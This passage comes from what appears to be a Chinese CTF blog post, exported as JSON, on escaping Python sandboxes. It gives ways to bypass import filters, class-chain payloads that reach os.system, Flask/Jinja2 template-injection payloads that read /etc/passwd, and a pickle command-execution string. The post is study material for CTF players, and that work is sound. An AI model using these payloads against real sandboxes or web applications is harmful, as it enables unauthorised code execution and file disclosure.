&apos;calendar&apos;, &apos;macpath&apos;, &apos;sqlite3&apos;, &apos;_collections_abc&apos;, &apos;certifi&apos;, &apos;macurl2path&apos;, &apos;sre_compile&apos;, &apos;_compat_pickle&apos;, &apos;cgi&apos;, &apos;mailbox&apos;, &apos;sre_constants&apos;, &apos;_compression&apos;, &apos;cgitb&apos;, &apos;mailcap&apos;, &apos;sre_parse&apos;, &apos;_crypt&apos;, &apos;chardet&apos;, &apos;mako&apos;, &apos;ssl&apos;, &apos;_csv&apos;, &apos;chunk&apos;, &apos;markupsafe&apos;, &apos;stat&apos;, &apos;_ctypes&apos;, &apos;cmath&apos;, &apos;marshal&apos;, &apos;statistics&apos;, &apos;_ctypes_test&apos;, &apos;cmd&apos;, &apos;math&apos;, &apos;string&apos;, &apos;_curses&apos;, &apos;code&apos;, &apos;mimetypes&apos;, &apos;stringprep&apos;, &apos;_curses_panel&apos;, &apos;codecs&apos;, &apos;mmap&apos;, &apos;struct&apos;, &apos;_datetime&apos;, &apos;codeop&apos;, &apos;modual_test&apos;, &apos;subprocess&apos;, &apos;_dbm&apos;, &apos;collections&apos;, &apos;modulefinder&apos;, &apos;sunau&apos;, &apos;_dbus_bindings&apos;, &apos;colorsys&apos;, &apos;multiprocessing&apos;, &apos;symbol&apos;, &apos;_dbus_glib_bindings&apos;, &apos;compileall&apos;, &apos;nacl&apos;, &apos;symtable&apos;, &apos;_decimal&apos;, &apos;concurrent&apos;, &apos;netrc&apos;, &apos;sys&apos;, &apos;_dummy_thread&apos;, &apos;configparser&apos;, &apos;nis&apos;, &apos;sysconfig&apos;, &apos;_elementtree&apos;, &apos;contextlib&apos;, &apos;nntplib&apos;, &apos;syslog&apos;, &apos;_functools&apos;, &apos;copy&apos;, &apos;ntpath&apos;, &apos;systemd&apos;, &apos;_gdbm&apos;, &apos;copyreg&apos;, &apos;nturl2path&apos;, &apos;tabnanny&apos;, &apos;_hashlib&apos;, &apos;crypt&apos;, &apos;numbers&apos;, &apos;tarfile&apos;, &apos;_heapq&apos;, &apos;cryptography&apos;, &apos;oauth&apos;, &apos;telnetlib&apos;, &apos;_imp&apos;, &apos;csv&apos;, &apos;olefile&apos;, &apos;tempfile&apos;, &apos;_io&apos;, &apos;ctypes&apos;, &apos;opcode&apos;, &apos;termios&apos;, &apos;_json&apos;, &apos;cups&apos;, &apos;operator&apos;, &apos;test&apos;, &apos;_locale&apos;, &apos;cupsext&apos;, &apos;optparse&apos;, &apos;textwrap&apos;, &apos;_lsprof&apos;, &apos;cupshelpers&apos;, &apos;orca&apos;, &apos;_lzma&apos;, &apos;curses&apos;, &apos;os&apos;, &apos;threading&apos;, &apos;_markupbase&apos;, &apos;datetime&apos;, &apos;ossaudiodev&apos;, &apos;time&apos;, &apos;_md5&apos;, &apos;dbm&apos;, &apos;parser&apos;, &apos;timeit&apos;, &apos;_multibytecodec&apos;, &apos;dbus&apos;, &apos;pathlib&apos;, &apos;token&apos;, &apos;_multiprocessing&apos;, &apos;deb822&apos;, &apos;pcardext&apos;, &apos;tokenize&apos;, &apos;_opcode&apos;, &apos;debconf&apos;, &apos;pdb&apos;, &apos;trace&apos;, &apos;_operator&apos;, &apos;debian&apos;, &apos;pexpect&apos;, &apos;traceback&apos;, &apos;_osx_support&apos;, &apos;debian_bundle&apos;, &apos;pickle&apos;, &apos;tracemalloc&apos;, &apos;_pickle&apos;, &apos;decimal&apos;, &apos;pickletools&apos;, &apos;tty&apos;, &apos;_posixsubprocess&apos;, &apos;defer&apos;, &apos;pipes&apos;, &apos;turtle&apos;, &apos;_pydecimal&apos;, &apos;difflib&apos;, &apos;pkg_resources&apos;, &apos;types&apos;, &apos;_pyio&apos;, &apos;dis&apos;, &apos;pkgutil&apos;, &apos;typing&apos;, &apos;_random&apos;, &apos;distro_info&apos;, &apos;platform&apos;, &apos;ufw&apos;, &apos;_sha1&apos;, &apos;distro_info_test&apos;, &apos;plistlib&apos;, &apos;unicodedata&apos;, &apos;_sha256&apos;, &apos;distutils&apos;, &apos;poplib&apos;, &apos;unittest&apos;, &apos;_sha3&apos;, &apos;doctest&apos;, &apos;posix&apos;, &apos;urllib&apos;, &apos;_sha512&apos;, &apos;dummy_threading&apos;, &apos;posixpath&apos;, &apos;urllib3&apos;, &apos;_signal&apos;, &apos;email&apos;, &apos;pprint&apos;, &apos;usbcreator&apos;, &apos;_sitebuiltins&apos;, &apos;encodings&apos;, &apos;problem_report&apos;, &apos;uu&apos;, &apos;_socket&apos;, &apos;enum&apos;, &apos;profile&apos;, &apos;uuid&apos;, &apos;_sqlite3&apos;, &apos;errno&apos;, &apos;pstats&apos;, &apos;venv&apos;, &apos;_sre&apos;, &apos;faulthandler&apos;, &apos;pty&apos;, &apos;wadllib&apos;, &apos;_ssl&apos;, &apos;fcntl&apos;, &apos;ptyprocess&apos;, &apos;warnings&apos;, &apos;_stat&apos;, &apos;filecmp&apos;, &apos;pwd&apos;, &apos;wave&apos;, &apos;_string&apos;, &apos;fileinput&apos;, &apos;py_compile&apos;, &apos;weakref&apos;, &apos;_strptime&apos;, &apos;fnmatch&apos;, &apos;pyatspi&apos;, &apos;webbrowser&apos;, &apos;_struct&apos;, &apos;formatter&apos;, &apos;pyclbr&apos;, &apos;wsgiref&apos;, &apos;_symtable&apos;, &apos;fractions&apos;, &apos;pydoc&apos;, &apos;xdg&apos;, &apos;_sysconfigdata_m_linux_x86_64-linux-gnu&apos;, &apos;ftplib&apos;, &apos;pydoc_data&apos;, &apos;xdrlib&apos;, &apos;_testbuffer&apos;, &apos;functools&apos;, &apos;pyexpat&apos;, &apos;xkit&apos;, &apos;_testcapi&apos;, &apos;gc&apos;, &apos;pygtkcompat&apos;, &apos;xml&apos;, &apos;_testimportmultiple&apos;, &apos;genericpath&apos;, &apos;pymacaroons&apos;, &apos;xmlrpc&apos;, &apos;_testmultiphase&apos;, &apos;getopt&apos;, &apos;pyrfc3339&apos;, &apos;xxlimited&apos;, &apos;_thread&apos;, &apos;getpass&apos;, &apos;pytz&apos;, &apos;xxsubtype&apos;, &apos;_threading_local&apos;, &apos;gettext&apos;, &apos;queue&apos;, &apos;yaml&apos;, &apos;_tracemalloc&apos;, &apos;gi&apos;, &apos;quopri&apos;, &apos;zipapp&apos;, &apos;_warnings&apos;, &apos;glob&apos;, &apos;random&apos;, &apos;zipfile&apos;, &apos;_weakref&apos;, &apos;grp&apos;, &apos;re&apos;, &apos;zipimport&apos;, &apos;_weakrefset&apos;, &apos;gtweak&apos;, &apos;readline&apos;, &apos;zlib&apos;, &apos;_yaml&apos;, &apos;gzip&apos;, &apos;reportlab&apos;, &apos;zope&apos;, &apos;abc&apos;, &apos;hashlib&apos;, &apos;reprlib&apos;, &apos;aifc&apos;, &apos;heapq&apos;\n]\n\nmethods = [&apos;os&apos;, &apos;sys&apos;, &apos;__builtins__&apos;]\n\nresults = {}\nfor module in all_modules_3:\n    results[module] = {\n        &apos;flag&apos;: 0,\n        &apos;result&apos;: {}\n    }\n\n    try:\n        m = __import__(module)\n        attrs = dir(m)\n        for method in methods:\n            if method in attrs:\n                result = &apos;yes&apos;\n                results[module][&apos;flag&apos;] = 1\n            else:\n                result = &apos;no&apos;\n\n            results[module][&apos;result&apos;][method] = result\n\n    except Exception as e:\n        print(e)\n\nfor result in results:\n    if results[result][&apos;flag&apos;]:\n        print(&apos;[+]&apos; + result)\n        for r in results[result][&apos;result&apos;]:\n            print(&apos;  [-]&apos; + r + &apos;: &apos; + results[result][&apos;result&apos;][r])</code></pre><p>从结果可以看到有相当大一部分模块都导入了“危险”的函数。只要我们可以 <code>import</code> 那么存在这些模块的环境就是危险的。</p>\n<h3 id=\"如果我们没办法-import-呢？\"><a href=\"#如果我们没办法-import-呢？\" class=\"headerlink\" title=\"如果我们没办法 import 呢？\"></a>如果我们没办法 import 呢？</h3><p>如果只是简单的禁用 <code>import os</code> 我们可以加空格绕过 <code>import   os</code> .</p>\n<p>如果多个空格也过滤了我们还可以 <code>__import__(&#39;os&#39;)</code>.</p>\n<p>如果过滤 os 我们还可以 <code>__import__(&quot;pbzznaqf&quot;.decode(&#39;rot_13&#39;))</code>。</p>\n<p>如果这也不行还有 <code>importlib:importlib.import_module(&#39;os&#39;).system(&#39;ls&#39;)</code>.</p>\n<p>联想到我们上面说的 <code>__builtin__/__builtins__</code>,一些危险内建函数都可以直接用，如果这些函数都被 del 掉我们可以 <code>reload(__builtin__)</code> 来重载一个完整的 <code>__builtin__</code>.</p>\n<p>reload 也是内建函数，如果这也没了呢？ </p>\n<pre><code>import imp\nimp.reload(__builtin__)</code></pre><p>也可以引入。</p>\n<p>如果 <code>sys.modules[&#39;os&#39;]=None</code> 从根源删除呢？</p>\n<p>实际上联系到 import 的原理</p>\n<blockquote>\n<p>如果是 import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A<br>如果是 from A import B，先为 A 创建 module 对象，再解析A，从中寻找B并填充到 A 的 dict 中</p>\n</blockquote>\n<p>如果 <code>sys</code> 可以用的话可以先确认一下路径</p>\n<pre><code>import sys\nprint(sys.path)</code></pre><p>本质上是执行一遍导入的库，这个过程可以用 <code>execfile</code> 来代替</p>\n<pre><code>execfile(&apos;/usr/lib/python2.7/os.py&apos;)\nsystem(&apos;ls&apos;)</code></pre><p>3.x 中删除了 execfile ，不过可以这样：</p>\n<pre><code>with open(&apos;/usr/lib/python3.6/os.py&apos;,&apos;r&apos;) as f:\n    exec(f.read())\nsystem(&apos;ls&apos;)</code></pre><p>还有一种方法：当我们使用 del sys.modules[‘os’] 时是不起作用的，因为在import 时会在检测到不存在 os 时重载一次，也就是说我们可以</p>\n<pre><code>sys.modules[&apos;os&apos;] = &apos;not allowed&apos; # oj 为你加的\n\ndel sys.modules[&apos;os&apos;]\nimport os\nos.system(&apos;ls&apos;)</code></pre><h3 id=\"其他一些小技巧\"><a href=\"#其他一些小技巧\" class=\"headerlink\" title=\"其他一些小技巧\"></a>其他一些小技巧</h3><ol>\n<li><p>过滤掉整个匹配语句我们可以使用变量替换的方式</p>\n<p> a = open<br> print(a(“d:/test.txt”).read())<br>  /etc/djmasl: das jdoas info<br> /<file system> <mount> <type><br> proc   /proc  0 /0 /dev/had2 / errors=dk,aspd 1…</type></mount></file></p>\n</li>\n<li><p>函数后面加空格、换行都能执行</p>\n</li>\n<li><p>如果程序中调用了第三方的库，恰好这个库有执行命令的函数</p>\n<p> from numpy.distutils.exec_command import _exec_command as system</p>\n<p> system(“ls /“)</p>\n</li>\n<li><p>使用别名</p>\n<p> import os as o</p>\n</li>\n<li><p>字符串拼接</p>\n<p> “l”+”s”</p>\n<p> “func_global”+”s”</p>\n</li>\n<li><p>字符串编码或者其他操作</p>\n<p> ‘X19pbXBvcnRfXw==’.decode(‘base64’) //<strong>import</strong></p>\n<p> <strong>import</strong>(‘so’[::-1]).system(‘ls’)</p>\n<p> eval(‘)”imaohw”(metsys.)”so”(<strong>tropmi</strong>‘[::-1])</p>\n<p> exec(‘)”imaohw”(metsys.so ;so tropmi’[::-1])</p>\n</li>\n</ol>\n<h2 id=\"通过继承关系逃逸\"><a href=\"#通过继承关系逃逸\" class=\"headerlink\" title=\"通过继承关系逃逸\"></a>通过继承关系逃逸</h2><p>通过 Python 的继承关也就是说我们想利用的模块被杀了之后我们想办法构造一条到基类的链然后再自顶向下重新找到一个可行的路来使用目标模块。 </p>\n<p>python 类中有个属性叫 <strong>mro</strong> ,是个元组记录了继承关系。</p>\n<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__mro__\n(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)</code></pre><p>通过文章最开始的介绍我们也可以通过多次使用 <code>__base__</code> 来找到基类 <code>object</code></p>\n<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__base__.__base__\n&lt;type &apos;object&apos;&gt;</code></pre><p>然后从基类向下回溯，使用 <code>__subclasses__</code></p>\n<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__mro__\n(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)\n&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2]\n&lt;type &apos;object&apos;&gt;\n&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__\n&lt;built-in method __subclasses__ of type object at 0x0000000061AE85E0&gt;\n&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__()\n[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;sys.getwindowsversion&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;nt.stat_result&apos;&gt;, &lt;type &apos;nt.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;type &apos;operator.itemgetter&apos;&gt;, &lt;type &apos;operator.attrgetter&apos;&gt;, &lt;type &apos;operator.methodcaller&apos;&gt;, &lt;type &apos;functools.partial&apos;&gt;, &lt;type &apos;MultibyteCodec&apos;&gt;, &lt;type &apos;MultibyteIncrementalEncoder&apos;&gt;, &lt;type &apos;MultibyteIncrementalDecoder&apos;&gt;, &lt;type &apos;MultibyteStreamReader&apos;&gt;, &lt;type &apos;MultibyteStreamWriter&apos;&gt;, &lt;class &apos;string.Template&apos;&gt;, &lt;class &apos;string.Formatter&apos;&gt;, &lt;type &apos;itertools.combinations&apos;&gt;, &lt;type &apos;itertools.combinations_with_replacement&apos;&gt;, &lt;type &apos;itertools.cycle&apos;&gt;, &lt;type &apos;itertools.dropwhile&apos;&gt;, &lt;type &apos;itertools.takewhile&apos;&gt;, &lt;type &apos;itertools.islice&apos;&gt;, &lt;type &apos;itertools.starmap&apos;&gt;, &lt;type &apos;itertools.imap&apos;&gt;, &lt;type &apos;itertools.chain&apos;&gt;, &lt;type &apos;itertools.compress&apos;&gt;, &lt;type &apos;itertools.ifilter&apos;&gt;, &lt;type &apos;itertools.ifilterfalse&apos;&gt;, &lt;type &apos;itertools.count&apos;&gt;, &lt;type &apos;itertools.izip&apos;&gt;, &lt;type &apos;itertools.izip_longest&apos;&gt;, &lt;type &apos;itertools.permutations&apos;&gt;, &lt;type &apos;itertools.product&apos;&gt;, &lt;type &apos;itertools.repeat&apos;&gt;, &lt;type &apos;itertools.groupby&apos;&gt;, &lt;type &apos;itertools.tee_dataobject&apos;&gt;, &lt;type &apos;itertools.tee&apos;&gt;, &lt;type &apos;itertools._grouper&apos;&gt;, &lt;type &apos;collections.deque&apos;&gt;, &lt;type &apos;deque_iterator&apos;&gt;, &lt;type &apos;deque_reverse_iterator&apos;&gt;, &lt;type &apos;_thread._localdummy&apos;&gt;, &lt;type &apos;thread._local&apos;&gt;, &lt;type &apos;thread.lock&apos;&gt;, &lt;type &apos;_io._IOBase&apos;&gt;, &lt;type &apos;_io.IncrementalNewlineDecoder&apos;&gt;, &lt;type &apos;_hashlib.HASH&apos;&gt;, &lt;type &apos;_random.Random&apos;&gt;, &lt;type &apos;cStringIO.StringO&apos;&gt;, &lt;type &apos;cStringIO.StringI&apos;&gt;, &lt;type &apos;Struct&apos;&gt;]</code></pre><p>我们发现结果太多了，网上找到 bendawang 师傅的脚本来循环找一下</p>\n<pre><code>#!/usr/bin/env python\n# encoding: utf-8\n\ncnt=0\nfor item in [].__class__.__base__.__subclasses__():\n    try:\n        if &apos;os&apos; in item.__init__.__globals__:\n            print cnt,item\n        cnt+=1\n    except:\n        print &quot;error&quot;,cnt,item\n        cnt+=1\n        continue</code></pre><p>利用这个来找到 <code>os</code> 模块的入口</p>\n<pre><code>#!/usr/bin/env python\n# encoding: utf-8\n\ncnt=0\nfor item in &quot;&quot;.__class__.__mro__[-1].__subclasses__():\n    try:\n        cnt2=0\n        for i in item.__init__.__globals__:\n            if &apos;eval&apos; in item.__init__.__globals__[i]:\n                print cnt,item,cnt2,i\n            cnt2+=1\n        cnt+=1\n    except:\n        print &quot;error&quot;,cnt,item\n        cnt+=1\n        continue</code></pre><p>这个相当于更深入一层查找</p>\n<p>存在的子模块可以通过 .index() 来进行查询，如果存在返回索引</p>\n<pre><code>&apos;&apos;.__class__.__mro__[2].__subclasses__().index(file)</code></pre><p>2.x 版本中有一个 warnings </p>\n<pre><code>&gt;&gt;&gt; import warnings\n&gt;&gt;&gt; warnings.os\nTraceback (most recent call last):\n  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;\nAttributeError: &apos;module&apos; object has no attribute &apos;os&apos;\n&gt;&gt;&gt; warnings.linecache\n&lt;module &apos;linecache&apos; from &apos;F:\\python2.7\\lib\\linecache.pyc&apos;&gt;\n&gt;&gt;&gt; warnings.linecache.os\n&lt;module &apos;os&apos; from &apos;F:\\python2.7\\lib\\os.pyc&apos;&gt;</code></pre><p>我们可以</p>\n<pre><code>[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;whoami&apos;)</code></pre><p>简单的给基类的所有模块编号</p>\n<pre><code>for i in enumerate(&apos;&apos;.__class__.__mro__[-1].__subclasses__()): print i</code></pre><p>如何便捷的找到我们想要的入口</p>\n<pre><code>[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == &apos;catch_warnings&apos;]</code></pre><h3 id=\"大佬们的payload\"><a href=\"#大佬们的payload\" class=\"headerlink\" title=\"大佬们的payload\"></a>大佬们的payload</h3><ol>\n<li><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;system&#39;](&#39;whoami&#39;) //3.x</code></li>\n<li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval, &#39;1+1&#39;)</code></li>\n<li><code>[].__getattribute__(&#39;append&#39;).__class__.__call__(eval, &#39;1+1&#39;)</code></li>\n<li><code>[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code></li>\n<li><code>[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code></li>\n<li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</code></li>\n<li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</code></li>\n<li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()</code></li>\n<li><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(&#39;func_globals&#39;)[&#39;linecache&#39;].__dict__[&#39;sys&#39;].modules[&#39;os&#39;].popen(&#39;ls&#39;).read()</code></li>\n</ol>\n<h3 id=\"过滤中括号\"><a href=\"#过滤中括号\" class=\"headerlink\" title=\"过滤中括号\"></a>过滤中括号</h3><p>如果碰到过滤 <code>[ ]</code> ，我们可以将 <code>[]</code> 的功能用 <code>pop</code> 、 <code>__getitem__</code>代替（实际上 <code>a[0]</code> 在内部就是调用了 <code>a.__getitem__(0)</code> ），<code>pop()</code> 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</p>\n<pre><code>&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get(&apos;linecache&apos;).os.popen(&apos;whoami&apos;).read()</code></pre><h3 id=\"过滤引号\"><a href=\"#过滤引号\" class=\"headerlink\" title=\"过滤引号\"></a>过滤引号</h3><p>requests.args 是 flask 中的一个属性，为返回请求的参数，这里把 path 作为变量名将后面的路径传进来，来绕过引号</p>\n<pre><code>{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&amp;path=/etc/passwd</code></pre><h3 id=\"过滤双下划线\"><a href=\"#过滤双下划线\" class=\"headerlink\" title=\"过滤双下划线\"></a>过滤双下划线</h3><p>同样利用  requests.args 属性</p>\n<pre><code>{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code></pre><h3 id=\"过滤关键字\"><a href=\"#过滤关键字\" class=\"headerlink\" title=\"过滤关键字\"></a>过滤关键字</h3><p>除了编码，我们还可以通过字符串拼接</p>\n<p><code>__getattribute__</code> 使用实例访问属性时,调用该方法</p>\n<pre><code>{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40](\"/etc/passwd\").read()}}</code></pre><h2 id=\"常用函数\"><a href=\"#常用函数\" class=\"headerlink\" title=\"常用函数\"></a>常用函数</h2><ol>\n<li>func_globals</li>\n</ol>\n<p>返回包含函数全局变量的字典的引用-定义函数的模块的全局命名空间</p>\n<ol start=\"2\">\n<li><strong>getattribute</strong></li>\n</ol>\n<p>被调用无条件地实现类的实例的属性访问</p>\n<pre><code>object. getattribute(self, name)\n1）self 必需的。类的实例，在调用时自动传递。\n2）name 必需的。属性的名称。</code></pre><ol start=\"3\">\n<li><strong>subclasses</strong>()[]</li>\n</ol>\n<p>获取子类</p>\n<ol start=\"4\">\n<li>getattr</li>\n</ol>\n<p>返回对象的命名属性的值</p>\n<pre><code>getattr(object,name) &lt;=&gt; object.name\n&gt;&gt;&gt; class A():\n...     bar =1\n...\n\n&gt;&gt;&gt; a = A()\n\n&gt;&gt;&gt; getattr(a,&apos;bar&apos;)\n1</code></pre><ol start=\"5\">\n<li><strong>name</strong></li>\n</ol>\n<p>使用 sys.modules[<strong>name</strong>] 获得模块的引用</p>\n<ol start=\"6\">\n<li><p>timeit</p>\n<p> timeit(命令，number=1)</p>\n<p> import timeit<br> timeit.timeit(“<strong>import</strong>(‘os’).system(‘dir’)”,number=1) </p>\n</li>\n<li><p>platform</p>\n</li>\n</ol>\n<p>模块和平台有关，主要是返回平台的一些信息</p>\n<pre><code>print platform.popen(&apos;dir&apos;,mode=&apos;r&apos;,bufsize= -1).read()</code></pre><ol start=\"8\">\n<li><strong>globals</strong></li>\n</ol>\n<p>常与 <code>__init__</code> 配合使用，<code>__init__</code> 一般跟在类的后面。相当于实例化这个类</p>\n<pre><code>[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)</code></pre><ol start=\"9\">\n<li><strong>call</strong></li>\n</ol>\n<p>使实例能够像函数一样被调用 <code>x.call() &lt;=&gt; x()</code></p>\n<ol start=\"10\">\n<li>pickle</li>\n</ol>\n<p>将对象储存在字符串对象中，实现对象的持久化</p>\n<p>序列化：</p>\n<pre><code>import pickle\ntest=(&apos;this is a test&apos;,3.14,[1,2,3,&quot;hh&quot;])\np=pickle.dumps(test)</code></pre><p>反序列化：</p>\n<pre><code>n=pickle.loads(p)</code></pre><p>我们可以加载命令：</p>\n<pre><code>pickle.loads(b&quot;cos\\nsystem\\n(S&apos;ls&apos;\\ntR.&quot;)</code></pre><ol start=\"11\">\n<li><p>os/subprocess/commands</p>\n<p>os.system(‘ipconfig’)<br>os.popen(‘ipconfig’)<br>commands.getoutput(‘ipconfig’)<br>commands.getstatusoutput(‘ifconfig’)<br>subrocess.call([‘ipconfig’],shell=true)</p>\n</li>\n<li><p>eval/exec/execfile</p>\n<p>eval() 执行 python 表达式执行的结果</p>\n<p>exec() 动态执行 python 代码，可以执行复杂的 python 代码，eval 只能计算一个表达式</p>\n<p>execfile() 执行一个文件的内容，文件是将被解析为 python 序列的类似模块的文件</p>\n</li>\n</ol>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><blockquote>\n<p><a href=\"https://www.cnblogs.com/hester/p/4694499.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/hester/p/4694499.html</a><br><a href=\"https://www.restran.net/2015/10/22/how-python-code-run/\" target=\"_blank\" rel=\"noopener\">https://www.restran.net/2015/10/22/how-python-code-run/</a><br><a href=\"https://www.freebuf.com/articles/system/203208.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/articles/system/203208.html</a><br><a href=\"https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/#21-os-subprocess-commands\" target=\"_blank\" rel=\"noopener\">https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/#21-os-subprocess-commands</a><br><a href=\"https://www.zhihu.com/question/38791962?sort=created\" target=\"_blank\" rel=\"noopener\">https://www.zhihu.com/question/38791962?sort=created</a></p>\n</blockquote>\n","text":"10/11/2019 2:26:44 PM Python 沙箱逃逸你真的看懂了么？python 沙箱逃逸就是在一个被严格限制了 python 执行环境中获取更高的权限，甚至 getshell ,这是我们的最终目的。但是在这之前我们需要绕过各种限制。由于环境中限制了许多敏感模块比如","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"}]}]}